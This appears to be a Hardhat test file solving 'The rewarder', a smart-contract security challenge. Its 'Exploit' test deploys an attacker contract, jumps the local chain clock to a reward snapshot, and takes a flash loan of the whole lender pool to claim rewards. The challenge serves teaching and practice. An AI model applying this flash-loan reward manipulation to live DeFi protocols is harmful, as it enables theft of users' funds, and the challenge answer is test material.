...
describe("[Challenge] The rewarder", function () {
  ...
  it("Exploit", async function () {
    const lastSnapshotTime =
      await this.rewarderPool.lastRecordedSnapshotTimestamp()

    const nextSnapshotTime = BigNumber.from(24 * 60 * 60 * 5).add(
      lastSnapshotTime
    )
    const nextSnapshotTimeNumber = parseInt(nextSnapshotTime.toString())

    /** CODE YOUR EXPLOIT HERE */
    const rewardAttackerContractFactory = await ethers.getContractFactory(
      "RewardAttacker",
      attacker
    )

    const rewardAttackerContract = await rewardAttackerContractFactory.deploy(
      this.flashLoanPool.address,
      this.rewarderPool.address,
      this.liquidityToken.address
    )

    // await ethers.provider.send("evm_increaseTime", [timeToAdd]) // 5 days
    await network.provider.send("evm_setNextBlockTimestamp", [
      nextSnapshotTimeNumber,
    ])
    await network.provider.send("evm_mine")

    // first check when isNewRewardsRound is true -> initiate the exploit at this time
    const isNewRewardsRound = await this.rewarderPool.isNewRewardsRound()
    console.log("is new rewards round", isNewRewardsRound)
    if (isNewRewardsRound) {
      // go and take a flashloan for amount = TOKENS_IN_LENDER_POOL
      await rewardAttackerContract.exploit(TOKENS_IN_LENDER_POOL)
    }

    // push time to the next reward period
    // await ethers.provider.send("evm_increaseTime", [timeToAdd]) // 5 days
    // const shiftSnapshotTime = BigNumber.from(24 * 60 * 60 * 5).add(
    //   nextSnapshotTime
    // )
    // const shiftSnapshotTimeNumber = parseInt(shiftSnapshotTime.toString())

    // await network.provider.send("evm_setNextBlockTimestamp", [
    //   shiftSnapshotTimeNumber,
    // ])
    // await network.provider.send("evm_mine")
  })
